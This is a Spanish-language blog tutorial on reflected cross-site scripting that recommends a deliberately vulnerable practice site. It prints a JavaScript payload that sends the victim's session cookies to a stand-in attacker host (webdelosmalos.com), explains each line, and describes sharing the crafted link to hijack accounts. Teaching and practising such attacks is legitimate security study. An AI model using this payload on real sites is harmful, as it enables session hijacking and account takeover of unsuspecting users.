---
layout: post
title: Ataque XSS Reflejado
category: Hacking
comments: true
description: El ataque XSS Reflejado consiste que el atacante comparta un link creado a sus victimas para que estas lo ejecuten y por conseguir su sesion o control sobre su navegador. El vector de ataque XSS o Cross Site Scripting, es una de las vulnerabilidades más extendidas en las paginas web, según OWASP es la tercera en importancia en su TOP 10.
tags:
    - hijacking

    - owasp
    - xss  
---

El ataque XSS Reflejado consiste que el atacante comparta un link creado a sus victimas para que estas lo ejecuten y por conseguir su sesion o control sobre su navegador.

Según la Open Web Application Security Project (Owasp), es desde ya casi diez años, la vulnerabilidad numero tres, de su [top diez](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)){:target="_blank"}. 

## Para practicar

Te recomiendo que uses esta pagina web: [hackyourselffirst.troyhunt.com](http://hackyourselffirst.troyhunt.com){:target="_blank"}. Es una pagina vulnerable hecho a posta para poder probar todas las vulnerabilidades web de Owasp, esta creada por el hacker etico [Troy Hunt](https://www.troyhunt.com/){:target="_blank"}. 
Tiene varios cursos de hacking en [Pluralsight](https://app.pluralsight.com/library/){:target="_blank"} te recomiendo que te subscribas a Pluralsight y los hagas.

## Ejecutando el ataque

En este ataque conseguiremos robar las cookies de sesion del usuario que entre al enlace que hemos pasado. 

Por ejemplo en nuestra web *miejemplo.com* en el buscador, buscamos por lechugas, y como vimos antes lo que ejecutamos en el buscador se refleja en el html sin niguna defensa, es decir si escribieramos < i >lechugas</ i > saldria *lechugas*, por lo que buscamos la palabra "lechugas" en el codigo fuente de la aplicación.
Al hacerlo vemos que esta el termino en varios sitios, y uno de ellos esta en el javascript.

{% highlight html linenos %}

  $('#searchTerm').val('lechugas');


{% endhighlight %}

Asi que podriamos montar un ataque que nos diera las cookies de sesion y asi poder acceder a la cuenta del usuario. ver [¿Que es session hijacking?]({% post_url 2017-05-26-que-es-session-hijacking %})


Este seria nuestro payload o codigo malicioso que añadiriamos a la url para pasarselo a nuestra victima:


{% highlight html linenos %}

  '); var img = document.createElement("img");img.src="http://webdelosmalos.com/LogCookies?cookies="+document.cookie;document.body.appenchild(img);$('h2').text('todo ok');//

{% endhighlight %}

EL codigo explicado seria asi:

{% highlight html linenos %}

'); 
var img = document.createElement("img");
img.src="http://webdelosmalos.com/LogCookies?cookies="+document.cookie;
document.body.appenchild(img);
$('h2').text('todo ok');
//

{% endhighlight %}

__linea 1__ como en slq injection cerramos las comillas y parentesis de la busqueda original para injectar nuestro payload en el javascript

__linea 2__ creamos un elemento img (tag imagen de html) y lo guardamos en una variable.

__linea 3__ en elemento img creado anteriormente le añadimos la url, deberia ser una imagen cualquiera, pero es de nuestra web mala y en pasamos como parametro los datos de las cookies de la victima.

__linea 4__ añadimos nuestra imagen la body del html

__linea 5__ para que el empleado no sospeche añadimos un texto en donde deberia ir el texto de busqueda original.

__linea 6__ igual que en el sql injection, todo lo que vaya posterior a nuestro payload lo comentamos para que no nos afecte.

Y con esto, solo necesitariamos añadirlo a la url original y pasar en enlace por las redes sociales, por email... y que nuestra victima picara, y al momento tendriamos en nuestra web las cookies de sesion de la victima, ya podriamos entrar como ella.




